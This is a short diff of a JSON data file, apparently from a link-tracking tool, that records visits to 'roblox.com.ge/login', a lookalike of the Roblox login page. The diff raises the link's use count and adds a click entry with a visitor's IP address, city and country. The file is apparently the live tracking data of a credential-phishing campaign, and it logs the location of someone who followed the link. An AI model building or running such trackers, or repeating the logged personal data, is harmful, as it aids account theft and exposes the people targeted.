@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1667,
+    "useCount": 1668,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13504,6 +13504,14 @@
         "city": "Hanoi",
         "flag": "🇻🇳",
         "countryCode": "VN"
+      },
+      {
+        "timestamp": 1777608560685,
+        "ip": "68.92.121.243",
+        "country": "United States",
+        "city": "Murfreesboro",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
